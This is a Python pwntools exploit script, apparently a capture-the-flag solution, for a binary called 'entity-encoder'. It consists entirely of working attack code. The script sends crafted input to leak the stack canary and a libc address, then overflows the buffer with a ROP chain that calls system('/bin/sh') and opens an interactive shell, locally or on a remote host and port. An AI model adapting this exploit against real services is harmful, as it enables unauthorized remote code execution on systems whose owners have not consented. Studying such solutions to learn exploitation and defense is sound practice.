#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./entity-encoder"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])
	) if args.REMOTE else process([exe], aslr=True)
if args.GDB: gdb.attach(io, """
	b *main+1090
	b *main+1110
""")

# Get the canary
io.sendlineafter(b":", b"/"*(0x100//3)+b"AAAA")
io.recvuntil(b"%20%20")
canary = unpack(b"\x00"+io.recv(7))
info("canary @ %#x" % canary)

# Get the libc leak:
io.sendlineafter(b":", b"/"*(0x100//3)+b"A"*0x14)
io.recvuntil(b"%20%2")
libc.address = fixleak(io.recvline()) - 0x2a130
info("libc @ %#x" % libc.address)

POPRDI_RET = libc.address + 0x000000000010f75b
RET = libc.address + 0x000000000019947e

info("RET @ %#x" % RET)

payload = flat(
	b"/"*0x57,
    b"\x00",
    canary,
    cyclic(0x8, n=0x8),
    POPRDI_RET,
    next(libc.search(b"/bin/sh\x00"))+5, # +5 to prevent any /,
    RET,
    libc.sym.system
)
io.sendlineafter(b":", payload)
io.sendlineafter(b":", b"exit")

io.interactive()
